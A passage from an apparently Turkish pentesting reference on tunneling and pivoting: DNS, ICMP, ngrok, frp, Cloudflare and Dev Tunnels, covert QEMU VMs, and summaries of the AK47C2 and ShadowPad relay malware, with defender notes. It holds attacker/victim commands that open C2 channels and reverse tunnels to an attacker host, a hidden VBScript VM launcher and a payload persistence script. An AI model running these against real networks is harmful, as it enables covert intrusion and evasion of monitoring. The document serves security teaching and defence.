[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) başka bir RDP sanal kanal tünelidir; varsayılan kanal adı `rdp2tcp` olsa da operatör farklı bir ad seçebilir.<sup>[[56]](#references)</sup> Kanal oluşturma ve kapatma işlemleri `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` günlüğüne sırasıyla **132** ve **148** olay kimlikleriyle kaydedilir. `rdp2tcp` ve nadir/rastgele kanal adlarını arayın, ardından bunları `XPSRD`, `cliprdr` ve `Microsoft::Windows::RDS::DisplayControl` gibi beklenen kanallarla karşılaştırın.<sup>[[58]](#references)</sup>

## Windows GUI Uygulamalarını Proxy Üzerinden Yönlendirme

Windows GUI uygulamalarını proxy üzerinden gezinecek şekilde yapılandırmak için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** bölümünde SOCKS sunucusunun IP adresini ve portunu ekleyin.\
**Profile -> Proxification Rules** bölümünde proxy üzerinden yönlendirmek istediğiniz programın adını ve bağlantıların yönlendirileceği IP adreslerini ekleyin; Proxifier kuralları uygulamalarla, hedef ana makinelerle ve portlarla eşleşebilir.<sup>[[27]](#references)</sup>

## NTLM proxy üzerinden tünel oluşturma

Daha önce bahsedilen **Rpivot** aracı, NTLM kimlik doğrulaması kullanan bir proxy üzerinden geçiş yapabilir. **OpenVPN** de bir auth dosyası ve NTLMv2 yöntemiyle yapılandırıldığında böyle bir proxy üzerinden yönlendirilebilir; bu, proxy kimlik doğrulamasını atlatmak değil, proxy üzerinden geçiştir.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm, upstream NTLM proxy'lerinde kimlik doğrulaması yapar, yerel dinleyiciler açar ve yerel bir tünel portunu hedef hizmete eşleyebilir; istemciler daha sonra bu yerel portu kullanabilir.<sup>[[29]](#references)</sup>\
Örneğin, 443 portunu yönlendirmek için.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Şimdi, örneğin hedef makinedeki **SSH** hizmetini 443 numaralı portu dinleyecek şekilde ayarlarsanız, saldırgan makinedeki 2222 numaralı port üzerinden bağlanabilirsiniz.<sup>[[29]](#references)</sup>\
Ayrıca saldırgan 2222 numaralı portu dinlerken, localhost:443'e bağlanan bir **meterpreter** da kullanabilirsiniz.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy), Microsoft'un .NET reverse-proxy araç setidir. Burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine, DNS sorguları üzerinden bir IPv4 tüneli oluşturur ve TUN arayüzlerini kullanır; belgelenen kurulum, her iki uçta da bu arayüzleri oluşturmak için gereken ayrıcalıkları gerektirir.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS aktarımı, doğrudan TCP'ye kıyasla daha fazla ek yük oluşturur ve genellikle yavaştır; bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Buradan indirin**](https://github.com/iagox86/dnscat2)**.**

Dnscat2, DNS üzerinden şifreli bir command-and-control kanalı kurar; aşağıdaki server ve client komutları, belgelenen kullanımı izler.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShell'de**

PowerShell'de dnscat2 client çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz; README'sinde aşağıda gösterilen `Start-Dnscat2` parametreleri belgelenmiştir.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscat ile Port forwarding**

dnscat2'nin etkileşimli `listen` komutu, yerel bir dinleyiciyi uzak bir ana bilgisayara ve porta eşler.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### proxychains DNS'ini değiştirme

Proxychains-ng, dinamik olarak bağlanan TCP bağlantılarına hook uygular ve UDP veya ICMP taşıyamaz; DNS proxying yapılandırılabilir, bu nedenle sabit bir public resolver varsaymak yerine kurulu `proxychains.conf` dosyasını ve resolver helper'ını inceleyin. Eski `proxyresolv` script'leri resolver'ı seçmek için `PROXY_DNS_SERVER` değişkenini sunar; dahili adlar gerektiğinde pivot üzerinden erişilebilen bir resolver kullanın.<sup>[[34]](#references)[[35]](#references)</sup>

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Özel DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 aktörü, kurumsal ağlarda nadiren engellenen iki protokol olan yalnızca giden **DNS** ve **düz HTTP POST** trafiğini kötüye kullanan **çift kanallı bir C2 ("AK47C2")** oluşturdu.<sup>[[2]](#references)</sup>

1. **DNS modu (AK47DNS)**
   • Rastgele 5 karakterli bir SessionID oluşturur (ör. `H4T14`).  
   • *Görev istekleri* için başına `1`, *sonuçlar* için başına `2` ekler ve farklı alanları (flags, SessionID, computer name) birleştirir.  
   • Her alan **ASCII `VHBD@H` anahtarıyla XOR şifrelemesine tabi tutulur**, hex olarak kodlanır ve noktalarla birleştirilir – son olarak saldırganın kontrolündeki alan adıyla biter:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • İsteklerde **TXT** (ve yedek olarak **MG**) kayıtları için `DnsQuery()` kullanılır.  
   • Yanıt 0xFF baytı aştığında backdoor, verileri 63 baytlık parçalara böler ve C2 sunucusunun parçaları yeniden sıralayabilmesi için şu işaretleyicileri ekler:
     `s<SessionID>t<TOTAL>p<POS>`

2. **HTTP mode (AK47HTTP)**
   • Bir JSON zarfı oluşturur:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Blob'un tamamı XOR-`VHBD@H` işleminden geçirilip → hex'e çevrilir → `Content-Type: text/plain` başlığıyla **`POST /`** isteğinin gövdesi olarak gönderilir.
   • Yanıt da aynı encoding'i izler ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile çalıştırılır.

Blue Team notları
• İlk etiketi uzun hexadecimal olan ve her zaman nadir görülen tek bir domain ile biten sıra dışı **TXT query**'leri arayın.
• ASCII-hex'in ardından gelen sabit bir XOR key, YARA ile kolayca tespit edilebilir: `6?56484244?484` (`VHBD@H`'nin hex karşılığı).
• HTTP için, gövdeleri yalnızca hex karakterlerinden oluşan ve iki byte'ın katı uzunluğa sahip `text/plain` POST isteklerini işaretleyin.

{{#note}}
Kanal, her alt domain etiketini 63-octet DNS sınırının içinde tutar; ancak protokole uygunluk tek başına trafiği gizli kılmaz. Nadir domain'ler, uzun hexadecimal etiketler ve sorgu hacmi hâlâ tespit sinyalleridir.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans, TUN device ve ICMP echo request'leri kullanan bir IPv4-over-ICMP tunnel'ı belgelendirir; kurulum için interface'i oluşturma yetkisine sahip olunması gerekir.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng, TCP bağlantılarını ICMP üzerinden taşır ve proxy, yerel dinleyici, hedef ana bilgisayar ve hedef port için aşağıda gösterilen `-p`, `-l`, `-r` ve `-R` seçeneklerini kullanır.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) yerel ağ hizmetlerini güvenli bir tünel üzerinden çevrimiçi hâle getiren bir agent'tır; CLI belgelerinde HTTP, TCP ve file URL uç noktaları açıklanır ve yazdırılan uç nokta ana bilgisayar adı, uç noktaya ve hesaba göre değişebilir.<sup>[[39]](#references)</sup>

### Kurulum

- Bir hesap oluşturun: https://ngrok.com/signup
- İstemciyi indirin:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Temel kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_İhtiyaç duyulduğunda agent, authentication ve TLS seçeneklerini de destekler.<sup>[[39]](#references)</sup>_

#### TCP Tünelleme

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTP ile dosyaları dışa açma

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTP calls için sniffing

_XSS,SSRF,SSTI ... için kullanışlıdır_\
Standalone agent, HTTP inceleme arayüzünü varsayılan olarak `http://127.0.0.1:4040` adresinde sunar; arayüz HTTP trafiği içindir.<sup>[[40]](#references)</sup>

#### Dahili HTTP service için tunneling

`--host-header=rewrite` seçeneği, upstream HTTP `Host` header'ını yerel service ile eşleşecek şekilde yeniden yazar.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml basit yapılandırma örneği

Bu, ngrok Agent Config v2 kullanır; adlandırılmış tüneller `proto` ve `addr` kullanır ve `ngrok start` ile başlatılır.<sup>[[42]](#references)</sup> 3 tünel açar:

- 2 TCP
- /tmp/httpbin/ dizininden statik dosyalar sunan 1 HTTP tunnel

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels, yerel TCP tabanlı bir hizmeti Microsoft relay altyapısı üzerinden yayımlayabilir. Host CLI, dışarı giden bir tünel oluştururken `devtunnel connect` istemcide barındırılan portu yeniden oluşturur; erişim denetimleri bilerek gevşetilmediği sürece tüneller varsayılan olarak kimlik doğrulaması gerektirir.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Bu, çevre ağında yeni bir inbound listener açmadan `*.devtunnels.ms` üzerinden RDP erişimi sağlayabilir. Ayrıca `rdp2tcp` gibi bir RDP virtual-channel tunnel ile katmanlanarak RDP oturumunu, isteğe bağlı TCP trafiği için ikinci aşama pivotuna dönüştürebilir.<sup>[[58]](#references)</sup>

Tehdit avcılığı için Dev Tunnels CLI'ın çalıştırılmasını `*.devtunnels.ms` adresine giden DNS/TLS trafiği ve beklenmeyen RDP virtual-channel olaylarıyla ilişkilendirin. Kimliği doğrulanmış bir tunnel, yalnızca Microsoft'a ait bir relay kullandığı için zararsız değildir.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel'ın `cloudflared` connector'ı outbound bağlantılar kurar; yayınlanan uygulamalar HTTP, HTTPS, TCP, SSH ve RDP trafiğini yönlendirebilirken quick tunnel'lar HTTP geliştirme için tasarlanmıştır.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel için tek satırlık komut

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 kaynağı (eski mod)

Eski `--socks5` flag'i, `cloudflared`'a yerel origin'in SOCKS5 konuştuğunu bildirir; yerel bir SOCKS5 listener oluşturmaz. Yönetilen bir tunnel için `originRequest.proxyType: socks`, SOCKS5 origin işleme biçimini yapılandırır.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNS ile kalıcı tüneller

Yerel olarak yönetilen tünel yapılandırmasında, aşağıda gösterildiği gibi küçük harfli `tunnel`, `credentials-file` ve `url` anahtarları kullanılır.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Bağlayıcıyı başlat:

```bash
cloudflared tunnel run mytunnel
```

Bağlayıcı dışarıya doğru bağlantılar kurar ve varsayılan olarak HTTP/2'ye geçiş yaparak QUIC üzerinde anlaşır; her dağıtımın TCP/443 kullandığını varsaymayın. Dağıtımınızın gerektirdiği asgari ayrıcalıklarla çalıştırın.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp), **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX ve XTCP** destekleyen bir Go reverse proxy'dir. XTCP, başarısı NAT'a bağlı olan P2P hole punching kullanır. **v0.53.0** sürümünden itibaren **SSH Tunnel Gateway** olarak çalışabilir; böylece hedef makine `frpc` binary'si olmadan standart OpenSSH istemcisini kullanabilir.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klasik reverse TCP tüneli

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Yeni SSH gateway'ini kullanma (frpc binary'si olmadan)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Yukarıdaki komut, `frps` gateway olarak çalışırken standart OpenSSH client'ını kullanarak kurbanın **8080** portunu **attacker_ip:9000** olarak yayımlar.<sup>[[50]](#references)</sup>

## QEMU ile Gizli VM Tünelleri

QEMU user-mode networking, sanal ağ için root veya yönetici ayrıcalığı gerektirmez ve `-netdev user,hostfwd=...` TCP, UDP veya UNIX bağlantılarını host'tan guest'e yönlendirir.<sup>[[51]](#references)</sup> TrustedSec, host odaklı EDR'ın guest içindeki etkinliği gözden kaçırabileceği bir olayda Tiny Core QEMU VM'ini ve denenen bir reverse SSH tunnel'ı belgeledi.<sup>[[1]](#references)</sup>

### Hızlı tek satırlık komut

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Yukarıdaki komut, 256 MiB konuk belleğine ve qcow2 disk imajına sahip bir **Tiny Core Linux** konuğu başlatır; disk imajı RAM disk değildir.
• Windows ana bilgisayarındaki **2222/tcp** portu, konuğun içindeki **22/tcp** portuna şeffaf biçimde yönlendirilir.
• Saldırganın bakış açısından hedef yalnızca 2222 portunu açığa çıkarır; bu porta ulaşan tüm paketler VM'de çalışan SSH sunucusu tarafından işlenir.

### VBScript üzerinden gizlice başlatma

TrustedSec, yukarıda atıfta bulunulan olayda VBS ile başlatılan QEMU örneklerini ve Tiny Core imajlarını gözlemledi.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs` ile script'i çalıştırmak pencereyi gizli tutar.<sup>[[1]](#references)</sup>

### Guest içinde persistence

Atıfta bulunulan olay, stateless Tiny Core guest'te `/opt/bootlocal.sh` ve `/opt/filetool.lst` aracılığıyla persistence sağlandığını açıklıyor:<sup>[[1]](#references)</sup>

1. Payload'ı `/opt/123.out` konumuna bırakın  
2. `/opt/bootlocal.sh` dosyasına ekleyin:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. `/opt/filetool.lst` dosyasına `home/tc` ve `opt` ekleyerek shutdown sırasında payload'ın `mydata.tgz` içine paketlenmesini sağlayın.

### Telemetry ile ilgili noktalar

• Host, QEMU process'ini, qcow2 image'ını ve host tarafından forward edilen listener'ı hâlâ açığa çıkarır.
• Yalnızca host üzerinde çalışan process taramaları guest process'lerini incelemeyebilir; ancak virtualization ile kaçış garanti değildir. Network, QEMU ve image telemetry'si yine de bunu açığa çıkarabilir.<sup>[[1]](#references)[[51]](#references)</sup>

### Defender ipuçları

• Kullanıcı tarafından yazılabilir dizinlerde **beklenmeyen QEMU/VirtualBox/KVM binary'leri** için alarm oluşturun.  
• `qemu-system*.exe` kaynaklı outbound bağlantıları engelleyin.  
• QEMU başlatıldıktan hemen sonra bağlanan nadir listening port'ları (2222, 10022, …) araştırın.

## `HttpAddUrl` üzerinden IIS/HTTP.sys relay node'ları (ShadowPad)

Check Point, ShadowPad'in IIS module'ünün `HttpAddUrl` üzerinden URL prefix'lerini bind ederek ele geçirilmiş çevre web sunucularını backdoor ve relay node'larına dönüştürdüğünü açıklıyor.<sup>[[3]](#references)</sup>

Aynı raporda aşağıda özetlenen varsayılanlar, wildcard listener'lar, packet decryption, relay queue'ları ve debug telemetry'si ayrıntılı olarak ele alınıyor.<sup>[[3]](#references)</sup>

* **Config varsayılanları** – module'ün JSON config'i değer içermiyorsa, makul görünen IIS varsayılanlarına (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`) geri döner. Böylece normal trafik, IIS tarafından doğru branding ile yanıtlanır.
* **Wildcard interception** – operatörler, noktalı virgülle ayrılmış URL prefix'leri listesi (host + path içinde wildcard'lar) sağlar. Module her girdi için `HttpAddUrl` çağırır; böylece HTTP.sys eşleşen istekleri malicious handler'a yönlendirirken eşleşmeyen istekler normal IIS davranışına döner.
* **Şifrelenmiş ilk packet** – request body'nin ilk iki byte'ı, custom 32-bit PRNG için seed'i taşır. Protocol parsing'den önce sonraki her byte, oluşturulan keystream ile XOR işleminden geçirilir:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Aktarma orkestrasyonu** – modül iki listeyi yönetir: “sunucular” (üst akış düğümleri) ve “istemciler” (alt akış implantları). Yaklaşık 30 saniye içinde heartbeat gelmezse girdiler listeden çıkarılır. Her iki liste de boş değilse ilk sağlıklı sunucu ile ilk sağlıklı istemci eşleştirilir ve taraflardan biri bağlantıyı kapatana kadar soketleri arasındaki baytlar doğrudan aktarılır.
* **Hata ayıklama telemetrisi** – isteğe bağlı günlükleme, her eşleşme için kaynak IP’yi, hedef IP’yi ve aktarılan toplam bayt sayısını kaydeder. Araştırmacılar bu izleri kullanarak birden fazla kurbanı kapsayan ShadowPad mesh ağını yeniden oluşturdu.

---

## İncelenecek diğer araçlar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Gölgelerde Saklanmak: QEMU Sanallaştırması Üzerinden Gizli Tüneller](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell Öncesi: Storm-2603’ün Önceki Fidye Yazılımı Operasyonlarını İncelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon’ın İç Yüzü: Gizli Bir Saldırı Operasyonunun Aktarma Ağını ve İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Başvuru Kılavuzu: Güvenlik Duvarı/IDS Kısıtlamalarını Aşma](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh kılavuzu](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config kılavuzu](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 sürüm notları](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit’te Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy modülü belgeleri](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute modülü belgeleri](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Ters Port Yönlendirme](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Hızlı Başlangıç](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Dinleyicileri](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat kılavuzu](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink kılavuzu](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY komut satırı seçenekleri](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier belgeleri](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Kuralları](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 kılavuzu](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Alan Adları - Uygulama ve Belirtim](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web İnceleme Arayüzü](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok sanal ana bilgisayarları](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Yapılandırması v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel genel bakış](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel kaynak parametreleri](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel kurulumu](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel yapılandırma dosyası](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel çalıştırma parametreleri](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp kavramları](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tünel Ağ Geçidi](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU ağ iletişimi belgeleri](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale kaynak deposu](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: BOF-PE Üzerinden CDN Ön Uçlu Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI komutları](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer ve Tünelleme](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
{{#include ../banners/hacktricks-training.md}}
